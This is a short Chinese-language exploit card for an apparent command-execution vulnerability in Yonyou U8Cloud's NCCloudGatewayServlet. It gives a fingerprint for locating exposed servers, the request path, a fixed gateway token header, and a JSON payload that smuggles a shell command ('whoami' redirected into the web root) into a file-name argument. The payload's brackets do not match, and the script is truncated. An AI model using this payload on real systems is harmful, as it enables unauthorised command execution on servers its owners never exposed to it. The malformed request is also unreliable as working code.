# 用友U8CloudNCCloudGatewayServlet存在命令执行漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title=="U8C"`
- **请求**：`POST /service/NCCloudGatewayServlet HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`gatewaytoken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3`

**请求体 / payload**
```
"serviceInfo": {
"serviceClassName": "com.ufida.zior.console.IActionInvokeService",
"serviceMethodName": "exec",
"serviceMethodArgInfo": [
"agg": false,
"isArray": false,
"isPrimitive": true,
"argType": { "body": "java.lang.String" },
"argValue": { "body": "nc.bs.pub.util.ProcessFileUtils" }
},
"agg": false,
"isArray": false,
"isPrimitive": true,
"argType": { "body": "java.lang.String" },
"argValue": { "body": "openFile" }
},
"agg": false,
"isArray": false,
"isPrimitive": false,
"argType": { "body": "java.lang.String" },
"argValue": {
"body": "123.txt \"whoami >webapps\\u8c_web\\1.txt\""
]
命令执…（脚本共 607 字，完整版见原文）
```
- **预期**：200　|　—